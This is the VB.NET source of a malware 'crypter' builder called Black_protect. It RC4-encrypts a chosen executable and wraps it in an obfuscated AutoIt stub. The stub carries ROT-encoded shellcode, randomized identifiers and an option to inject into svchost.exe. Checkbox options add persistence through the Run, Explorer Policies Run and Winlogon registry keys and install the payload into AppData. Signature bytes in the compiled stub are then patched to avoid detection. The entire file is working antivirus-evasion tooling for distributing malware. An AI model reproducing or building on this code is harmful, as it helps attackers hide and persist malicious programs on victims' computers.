Imports Black_protect.Crypto
Imports Black_protect.ReadFile
Imports System.Runtime.InteropServices
Imports System.Text

Public Class Form1

    Private inputFile As String = Nothing
    Private output As String = Nothing

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim o As New OpenFileDialog
        o.Filter = "|*.exe"
        If o.ShowDialog = vbOK Then
            inputFile = ReadFile.ReadFile(o.FileName)
            TextBox1.Text = o.FileName
        Else
            Exit Sub
        End If
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        Dim base_Folder As String = Application.StartupPath & "\Resources\"
        Dim RR As New Random
        Dim source_Base As String = My.Resources.Source
        Dim Absolut_Key As Integer = 55
        source_Base = source_Base.Replace("%FileSplit%", Crypto.ROTN_Forward(txtSplit.Text, Absolut_Key))
        source_Base = source_Base.Replace("%Absolut_Key%", Absolut_Key)

        source_Base = source_Base.Replace("%EncryptionKey%", Crypto.ROTN_Forward(txtKey.Text, Absolut_Key))
        source_Base = source_Base.Replace("%Absolut_Key%", Absolut_Key)

        If rbInternal.Checked Then
            source_Base = source_Base.Replace(";Internal", Nothing)
        ElseIf rbExternal.Checked Then
            source_Base = source_Base.Replace(";External", Nothing)
            source_Base = source_Base.Replace("C:\Windows\System32\svchost.exe", Crypto.ROTN_Forward("C:\Windows\System32\svchost.exe", Absolut_Key))
            source_Base = source_Base.Replace("%Absolut_Key%", Absolut_Key)
        End If

        If chkStartup.Checked Then
            source_Base = source_Base.Replace("%KeyName%", Crypto.ROTN_Forward(txtName.Text, 13))
            source_Base = source_Base.Replace("#AppDataPath#", Crypto.ROTN_Forward("%AppData%", 13))
            If Not txtInstall.Text.EndsWith(".exe") Then
                txtInstall.Text += ".exe"
            End If
            source_Base = source_Base.Replace("%InstallFolder%", Crypto.ROTN_Forward(txtInstall.Text, 13))
            If chkPolicies.Checked Then
                source_Base = source_Base.Replace(";Policies", Nothing)
                source_Base = source_Base.Replace("%PoliciesExplorerRun%", Crypto.ROTN_Forward("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\", 12))
            End If
            If chkRun.Checked Then
                source_Base = source_Base.Replace(";Run", Nothing)
                source_Base = source_Base.Replace("%CurrentRun%", Crypto.ROTN_Forward("HKCU\Software\Microsoft\Windows\CurrentVersion\Run\", 12))
            End If
            If chkWinlogon.Checked Then
                source_Base = source_Base.Replace(";Winlogon", Nothing)
                source_Base = source_Base.Replace("%RunWinlogon%", Crypto.ROTN_Forward("HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", 12))
            End If
            If chkStartPath.Checked Then
                source_Base = source_Base.Replace(";Startpath", Nothing)
            End If
            If rbMove.Checked Then
                source_Base = source_Base.Replace(";#MoveFile", Nothing)
            Else
                source_Base = source_Base.Replace(";#CopyFile", Nothing)
            End If
        End If


        'Start Encryption
        source_Base = GenerateUniqueShellcode(source_Base)
        source_Base = GenerateUniqueRC4(source_Base)
        source_Base = GenerateUniqueROT(source_Base)

        Dim vars() As String = New String() {"$var21", "$var22", "$var23"}

        For i As Integer = 0 To vars.Length - 1
            source_Base = source_Base.Replace(vars(i), "$" & random_key(RR.Next(5, 30)))
        Next

        IO.File.WriteAllText(base_Folder & "source.au3", source_Base)
        If chkicon.Checked Then
            compile_Stub(base_Folder, TextBox2.Text)
        Else
            compile_Stub(base_Folder)
        End If
        Threading.Thread.Sleep(2000)
        DaemonPatcher.SequencePatch(base_Folder & "stub.exe", "994C530A86D6487DA3484BBE986C4AA9", "4556494C455945214556494C45594521")
        DaemonPatcher.SequencePatch(base_Folder & "stub.exe", "A3484BBE986C4AA9994C530A86D6487D", "4556494C455945214556494C45594521")
        FileOpen(1, base_Folder & "stub.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
        output = Space(LOF(1))
        FileGet(1, output)
        FileClose(1)
        Dim s As New SaveFileDialog
        s.Filter = "|*.exe"
        If s.ShowDialog = vbOK Then
            FileOpen(1, s.FileName, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
            Dim Data As String = RC4(inputFile, txtKey.Text)
            Dim Tableau As String = String.Format("{0}{1}{0}sdgskjdiofjqsdioghndsilghnsduofhjiduofjhnqiuodfjhnbidus{0}r5dhg41drfhdf96h51gf85j45df5g48h85{0}", txtSplit.Text, Data)
            FilePut(1, output & Tableau)
            FileClose(1)

            IO.File.Delete(base_Folder & "source.au3")
            IO.File.Delete(base_Folder & "stub.exe")
            MsgBox("File Crypted !", MsgBoxStyle.Information)
        End If
    End Sub


#Region "Generate Unique ROT"

    Public Function GenerateUniqueROT(ByVal source_Base As String) As String
        Dim RR As New Random

        Dim vars() As String = New String() {"$var17", "$var18", "$var19", "$var20"}

        For i As Integer = 0 To vars.Length - 1
            source_Base = source_Base.Replace(vars(i), "$" & random_key(RR.Next(5, 30)))
        Next

        source_Base = source_Base.Replace("func3", random_key(RR.Next(5, 30)))

        Return source_Base
    End Function

#End Region

#Region "Generate Unique RC4"

    Public Function GenerateUniqueRC4(ByVal source_Base As String) As String
        Dim RR As New Random
        Dim Int_keys As Integer = RR.Next(1, 100)
        source_Base = source_Base.Replace("#RC4_1#", Crypto.ROTN_Forward("0xC81001006A006A005356578B551031C989C84989D7F2AE484829C88945F085C00F84DC000000B90001000088C82C0188840DEFFEFFFFE2F38365F4008365FC00817DFC000100007D478B45FC31D2F775F0920345100FB6008B4DFC0FB68C0DF0FEFFFF01C80345F425FF0000008945F48B75FC8A8435F0FEFFFF8B7DF486843DF0FEFFFF888435F0FEFFFFFF45FCEBB08D9DF0FEFFFF31FF89FA39550C76638B85ECFEFFFF4025FF0000008985ECFEFFFF89D80385ECFEFFFF0FB6000385E8FEFFFF25FF0000008985E8FEFFFF89DE03B5ECFEFFFF8A0689DF03BDE8FEFFFF860788060FB60E0FB60701C181E1FF0000008A840DF0FEFFFF8B750801D6300642EB985F5E5BC9C21000", Int_keys))
        source_Base = source_Base.Replace("%Int_RC4_1%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#RC4_2#", Crypto.ROTN_Forward("byte[", Int_keys))
        source_Base = source_Base.Replace("%Int_RC4_2%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#RC4_3#", Crypto.ROTN_Forward("]", Int_keys))
        source_Base = source_Base.Replace("%Int_RC4_3%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#RC4_4#", Crypto.ROTN_Forward("user32.dll", Int_keys))
        source_Base = source_Base.Replace("%Int_RC4_4%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#RC4_5#", Crypto.ROTN_Forward("CallWindowProc", Int_keys))
        source_Base = source_Base.Replace("%Int_RC4_5%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#RC4_6#", Crypto.ROTN_Forward("str", Int_keys))
        source_Base = source_Base.Replace("%Int_RC4_6%", Int_keys)

        Dim vars() As String = New String() {"$var11", "$var12", "$var13", "$var14", "$var15", "$var16"}

        For i As Integer = 0 To vars.Length - 1
            source_Base = source_Base.Replace(vars(i), "$" & random_key(RR.Next(5, 30)))
        Next

        source_Base = source_Base.Replace("func2", random_key(RR.Next(5, 30)))

        Return source_Base
    End Function

#End Region

#Region "Generate Shellcode fonction"
    Public Function GenerateUniqueShellcode(ByVal source_Base As String) As String
        Dim RR As New Random
        Dim Int_keys As Integer = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_1#", Crypto.ROTN_Forward("0x3078363045383445303030303030364230303635303037323030364530303635303036433030333330303332303030303030364530303734303036343030364", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_1%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_2#", Crypto.ROTN_Forward("33030364330303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_2%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_3#", Crypto.ROTN_Forward("30303030303030303030303030303030303030303030303030303030303030303542384246433641343245384242303330303030384235343234323838393131384235343234324336413", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_3%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_4#", Crypto.ROTN_Forward("34545384141303330303030383931313641344145384131303330303030383933393641314536413343453839443033303030303641323236384634303030303030453839313033303030", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_4%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_5#", Crypto.ROTN_Forward("30364132363641323445383838303330303030364132413641343045383746303330303030364132453641304345383736303330303030364133323638433830303030303045383641303", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_5%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_6#", Crypto.ROTN_Forward("33030303036413241453835433033303030303842303943373031343430303030303036413132453834443033303030303638354245383134434635314538373930333030303036413345", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_6%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_7#", Crypto.ROTN_Forward("45383342303330303030384244313641314545383332303330303030364134304646333246463331464644303641313245383233303330303030363835424538313443463531453834463", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_7%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_8#", Crypto.ROTN_Forward("03330303030364131454538313130333030303038423039384235313343364133454538303530333030303038423339303346413641323245384641303230303030384230393638463830", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_8%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_9#", Crypto.ROTN_Forward("30303030303537353146464430364130304538453830323030303036383838464542333136353145383134303330303030364132454538443630323030303038423339364132414538434", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_9%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_10#", Crypto.ROTN_Forward("43032303030303842313136413432453843343032303030303537353236413030364130303641303436413030364130303641303036413030464633314646443036413132453841393032", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_10%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_11#", Crypto.ROTN_Forward("30303030363844303337313046323531453844353032303030303641323245383937303230303030384231313641324545383845303230303030384230394646373233344646333146464", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_11%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_12#", Crypto.ROTN_Forward("43036413030453837453032303030303638394339353141364535314538414130323030303036413232453836433032303030303842313138423339364132454538363130323030303038", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_12%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_13#", Crypto.ROTN_Forward("42303936413430363830303330303030304646373235304646373733344646333146464430364133364538343730323030303038424431364132324538334530323030303038423339364", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_13%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_14#", Crypto.ROTN_Forward("13345453833353032303030303842333136413232453832433032303030303842303136413245453832333032303030303842303935324646373735343536464637303334464633313641", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_14%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_15#", Crypto.ROTN_Forward("30304538313030323030303036384131364133444438353145383343303230303030383343343043464644303641313245384639303130303030363835424538313443463531453832353", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_15%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_16#", Crypto.ROTN_Forward("03230303030364132324538453730313030303038423131383343323036364133414538444230313030303036413032353235314646443036413336453843453031303030304337303130", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_16%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_17#", Crypto.ROTN_Forward("30303030303030423832383030303030303641333645384243303130303030463732313641314545384233303130303030384231313842353233433831433246383030303030303033443", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_17%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_18#", Crypto.ROTN_Forward("03641334545383946303130303030303331313641323645383936303130303030364132383532464633313641313245383841303130303030363835424538313443463531453842363031", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_18%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_19#", Crypto.ROTN_Forward("30303030383343343043464644303641323645383733303130303030384233393842303938423731313436413345453836353031303030303033333136413236453835433031303030303", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_19%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_20#", Crypto.ROTN_Forward("84230393842353130433641323245383530303130303030384230393033353133343641343645383434303130303030384243313641324545383342303130303030384230393530464637", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_20%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_21#", Crypto.ROTN_Forward("37313035363532464633313641303045383241303130303030363841313641334444383531453835363031303030303833433430434646443036413336453831333031303030303842313", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_21%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_22#", Crypto.ROTN_Forward("13833433230313839313136413341453830353031303030303842303933424341304638353333464646464646364133324538463430303030303038423039433730313037303030313030", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_22%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_23#", Crypto.ROTN_Forward("36413030453845353030303030303638443243374137363835314538313130313030303036413332453844333030303030303842313136413245453843413030303030303842303935324", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_23%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_24#", Crypto.ROTN_Forward("64637313034464644303641323245384242303030303030384233393833433733343641333245384146303030303030384233313842423641343030303030303833433630383641324545", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_24%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_25#", Crypto.ROTN_Forward("38394430303030303038423131364134364538393430303030303035313641303435373536464633323641303045383836303030303030363841313641334444383531453842323030303", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_25%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_26#", Crypto.ROTN_Forward("03030383343343043464644303641323245383646303030303030384230393842353132383033353133343641333245383630303030303030384230393831433142303030303030303839", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_26%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_27#", Crypto.ROTN_Forward("31313641303045383446303030303030363844334337413745383531453837423030303030303641333245383344303030303030384244313641324545383334303030303030384230394", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_27%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_28#", Crypto.ROTN_Forward("64633324646373130344646443036413030453832343030303030303638383833463441394535314538353030303030303036413245453831323030303030303842303946463731303446", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_28%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_29#", Crypto.ROTN_Forward("46443036413441453830343030303030303842323136314333384243423033344332343034433336413030453846324646464646463638353443414146393135314538314530303030303", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_29%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_30#", Crypto.ROTN_Forward("03641343036383030313030303030464637343234313836413030464644304646373432343134453843464646464646463839303138334334313043334538323230303030303036384134", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_30%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_31#", Crypto.ROTN_Forward("34453045454335304538344230303030303038334334303846463734323430344646443046463734323430383530453833383030303030303833433430384333353535323531353335363", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_31%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_32#", Crypto.ROTN_Forward("53733334330363438423730333038423736304338423736314338423645303838423745323038423336333834373138373546333830334636423734303738303346344237343032454245", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_32%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_33#", Crypto.ROTN_Forward("37384243353546354535423539354135444333353535323531353335363537384236433234314338354544373434333842343533433842353432383738303344353842344131383842354", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_33%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_34#", Crypto.ROTN_Forward("13230303344444533333034393842333438423033463533334646333343304643414338344330373430374331434630443033463845424634334237433234323037354531384235413234", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_34%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("#Shellcode_35#", Crypto.ROTN_Forward("3033444436363842304334423842354131433033444438423034384230334335354635453542353935413544433343333030303030303030", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_35%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("%1_Call%", Crypto.ROTN_Forward("User32", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_36%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("%2_Call%", Crypto.ROTN_Forward("none", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_37%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("%3_Call%", Crypto.ROTN_Forward("CallWindowProcA", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_38%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("%4_Call%", Crypto.ROTN_Forward("ptr", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_39%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("%5_Call%", Crypto.ROTN_Forward("wstr", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_40%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("%6_Call%", Crypto.ROTN_Forward("int", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_41%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("%1_Other%", Crypto.ROTN_Forward("Boolean[", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_42%", Int_keys)

        Int_keys = RR.Next(1, 100)
        source_Base = source_Base.Replace("%2_Other%", Crypto.ROTN_Forward("]", Int_keys))
        source_Base = source_Base.Replace("%Int_Key_43%", Int_keys)

        Dim vars() As String = New String() {"$var01", "$var02", "$var03", "$var04", "$var05", "$var06", "$var07", "$var08", "$var09", "$var10"}

        For i As Integer = 0 To vars.Length - 1
            source_Base = source_Base.Replace(vars(i), "$" & random_key(RR.Next(5, 30)))
        Next

        source_Base = source_Base.Replace("func1", random_key(RR.Next(5, 30)))

        Return source_Base
    End Function

#End Region

    Public Function random_key(ByVal lenght As Integer) As String
        Randomize()
        Dim sado As New System.Text.StringBuilder("")
        Dim b() As Char = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            sado.Append(b(z))
        Next
        Return sado.ToString
    End Function
    Public Sub compile_Stub(ByVal input_Path As String, Optional ByVal iconpath As String = Nothing)
        Dim aut2exe_Exe As String = input_Path & "Aut2exe.exe"
        Dim args As String = " /in Resources\source.au3" & " /out Resources\stub.exe /icon "
        If Not iconpath = Nothing Then
            args = args & iconpath & " /nopack"
        Else
            args = args & "Resources\icon.ico /nopack"
        End If
        Shell(aut2exe_Exe + args, AppWinStyle.Hide, True, 5)
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Dim R As New Random
        txtKey.Text = MD5(R.Next(10, 9999) << R.Next(10, 9999))
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        Dim R As New Random
        txtSplit.Text = MD5(R.Next(10, 9999) << R.Next(10, 9999))
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim o As New OpenFileDialog
        o.Filter = "|*.ico"
        If o.ShowDialog = vbOK Then
            TextBox2.Text = o.FileName
            PictureBox2.ImageLocation = o.FileName
        Else
            Exit Sub
        End If
    End Sub

    Private Sub chkStartup_CheckedChanged(sender As Object, e As EventArgs) Handles chkStartup.CheckedChanged
        If chkStartup.Checked Then
            GroupBox2.Enabled = True
            txtName.Enabled = True
            txtInstall.Enabled = True
            Label1.Enabled = True
            Label2.Enabled = True
        Else
            GroupBox2.Enabled = False
            txtName.Enabled = False
            txtInstall.Enabled = False
            Label1.Enabled = False
            Label2.Enabled = False
        End If
    End Sub
End Class
